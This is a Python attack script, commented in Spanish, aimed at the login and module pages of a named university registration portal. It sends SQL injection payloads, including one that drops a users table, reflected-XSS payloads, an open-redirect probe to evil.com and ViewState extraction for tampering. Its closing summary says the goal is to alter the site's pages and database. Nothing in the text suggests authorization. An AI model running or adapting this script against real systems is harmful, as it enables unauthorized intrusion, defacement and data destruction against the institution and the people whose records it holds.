#!/usr/bin/env python3
import requests, urllib3, re, urllib.parse
urllib3.disable_warnings()

s = requests.Session()
s.verify = False
s.headers.update({
    'User-Agent': 'Mozilla/5.0',
    'Content-Type': 'application/x-www-form-urlencoded',
})

print("=== PROBANDO SQL INJECTION Y XSS ===\n")

# ============================================
# 1. SQL Injection en j_security_check
# ============================================
print("1. SQL INJECTION EN j_security_check:")

sql_payloads = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "admin' --",
    "admin' #",
    "' OR 1=1 --",
    "' OR 1=1#",
    "' OR 1=1/*",
    "' UNION SELECT null --",
    "'; DROP TABLE users --",
]

for payload in sql_payloads:
    s_sql = requests.Session()
    s_sql.verify = False
    r_sql = s_sql.post('https://registro.uns.edu.pe/udemsi/j_security_check',
                           data={'j_username': payload, 'j_password': 'anything'},
                           timeout=5, allow_redirects=True)
    cookies = dict(s_sql.cookies)
    has_session = 'JSESSIONID' in cookies
    # Check if the response changed (different from login page)
    if has_session:
        print(f"  [!] SQL INJECTION FUNCIONO: {payload}")
        print(f"  Session created: {cookies}")
    else:
        print(f"  No session: {payload[:30]}")

# ============================================
# 2. XSS - Verificar si el error refleja el usuario
# ============================================
print("\n2. XSS EN MENSAJES DE ERROR:")

xss_payloads = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '<body onload=alert(1)>',
    '" onmouseover="alert(1)',
    "'><script>alert(1)</script>",
    '<input type="text" value="x"><script>alert(1)</script>',
]

for xss in xss_payloads:
    s_xss = requests.Session()
    s_xss.verify = False
    r_xss = s_xss.post('https://registro.uns.edu.pe/udemsi/j_security_check',
                           data={'j_username': xss, 'j_password': xss},
                           timeout=5, allow_redirects=True)
    # Check if the payload is reflected in the response
    if xss in r_xss.text:
        print(f"  [!] XSS REFLECTED: {xss[:50]}")
        # Find context
        idx = r_xss.text.find(xss)
        ctx = r_xss.text[max(0,idx-30):idx+60]
        ctx_clean = re.sub(r'<[^>]+>', ' ', ctx)
        ctx_clean = re.sub(r'\s+', ' ', ctx_clean).strip()
        print(f"  Context: {ctx_clean[:200]}")
    else:
        print(f"  Not reflected: {xss[:30]}")

# ============================================
# 3. XSS en modulos.xhtml
# ============================================
print("\n3. XSS EN MODULOS.XHTML:")
# Authenticate first
s_auth = requests.Session()
s_auth.verify = False
s_auth.post('https://registro.uns.edu.pe/udemsi/j_security_check',
                data={'j_username':'fake','j_password':'fake'}, timeout=5)

# Check if ViewState or other parameters reflect user input
r_mod = s_auth.get('https://registro.uns.edu.pe/udemsi/faces/modulos.xhtml', timeout=5)

# Look for any parameter reflection
# Check if legajo, id, modulo params are reflected
for param in ['legajo', 'id', 'modulo', 'usuario', 'nombre']:
    r_param = s_auth.get(f'https://registro.uns.edu.pe/udemsi/faces/modulos.xhtml?{param}=<script>alert(1)</script>', timeout=3)
    if '<script>' in r_param.text:
        print(f"  [!] XSS via URL parameter {param}")

# ============================================
# 4. Intentar cambiar el contenido del login via parametros
# ============================================
print("\n4. MANIPULACION DE CONTENIDO DEL LOGIN:")

# Try to modify the login page through URL parameters
r_login_orig = requests.get('https://registro.uns.edu.pe/udemsi/faces/index.xhtml', timeout=5)
orig_title = re.search(r'<title>([^<]+)</title>', r_login_orig.text)
orig_text = re.sub(r'<[^>]+>', ' ', r_login_orig.text)
orig_text = re.sub(r'\s+', ' ', orig_text).strip()[:300]
print(f"Original title: {orig_title.group(1) if orig_title else 'None'}")

# Try URL parameters
for param in ['?id=1', '?view=1', '?legajo=test', '?nombre=test']:
    r_p = requests.get(f'https://registro.uns.edu.pe/udemsi/faces/index.xhtml{param}', timeout=3)
    new_title = re.search(r'<title>([^<]+)</title>', r_p.text)
    new_text = re.sub(r'<[^>]+>', ' ', r_p.text)
    new_text = re.sub(r'\s+', ' ', new_text).strip()[:300]
    if new_title.group(1) != orig_title.group(1) if orig_title and new_title else True:
        print(f"  [!] Title changed with {param}")
    if new_text != orig_text:
        print(f"  [!] Content changed with {param}")
        print(f"  New: {new_text[:200]}")

# ============================================
# 5. Probar si el formulario j_security_check acepta parametros adicionales
# ============================================
print("\n5. PARAMETROS ADICIONALES EN j_security_check:")
# Try to add extra parameters that might modify behavior
extra_params = [
    {'j_username':'fake','j_password':'fake','redirect':'https://evil.com'},
    {'j_username':'fake','j_password':'fake','action':'edit'},
    {'j_username':'fake','j_password':'fake','cmd':'update'},
]
for extra in extra_params:
    r_extra = s.post('https://registro.uns.edu.pe/udemsi/j_security_check',
                         data=extra, timeout=5)
    # Check if redirect happens to the extra URL
    if 'evil.com' in r_extra.text or 'https://evil.com' in r_extra.text:
        print(f"  [!] Redirect to evil.com possible!")
    if 'action=edit' in r_extra.text or 'cmd=update' in r_extra.text:
        print(f"  [!] Action parameter accepted!")

# ============================================
# 6. Probar si se puede modificar el ViewState para cambiar el contenido
# ============================================
print("\n6. MANIPULACION DE VIEWSTATE PARA MODIFICAR PAGINA:")
# In JSF, the ViewState can contain form data
# If we can manipulate it, we might change what the server renders
r_vs = requests.get('https://registro.uns.edu.pe/udemsi/faces/index.xhtml', timeout=5)
vs_match = re.search(r'name=\"javax\.faces\.ViewState\"[^>]*value=\"([^\"]+)\"', r_vs.text)
vs_val = vs_match.group(1) if vs_match else ''
print(f"ViewState value (first 100 chars): {vs_val[:100]}")
print(f"ViewState length: {len(vs_val)}")
# This is base64 encoded - we could potentially decode and modify it
try:
    decoded = urllib.parse.unquote(vs_val)
    print(f"Decoded (first 200): {decoded[:200]}")
except:
    print("Could not decode ViewState")

# ============================================
# 7. Probar XSS en la pagina de error de login
# ============================================
print("\n7. PAGINA DE ERROR DEL LOGIN:")
# Try to trigger an error and see if user input is reflected
r_err = s.post('https://registro.uns.edu.pe/udemsi/j_security_check',
                   data={'j_username':'<script>alert("XSS")</script>','j_password':'test'},
                   timeout=5, allow_redirects=True)
# Check if the error page reflects the script
if '<script>' in r_err.text:
    idx = r_err.text.find('<script>')
    ctx = r_err.text[max(0,idx-50):idx+100]
    ctx_clean = re.sub(r'<[^>]+>', ' ', ctx)
    print(f"  [!] XSS in error page: {ctx_clean[:200]}")

print("\n=== RESUMEN FINAL ===")
print("Si se encontro XSS o SQL Injection, el usuario puede:")
print("1. XSS -> Modificar el contenido de la pagina web")
print("2. SQL Injection -> Modificar datos en la base de datos")
print("3. ViewState manipulation -> Potencialmente cambiar el renderizado")
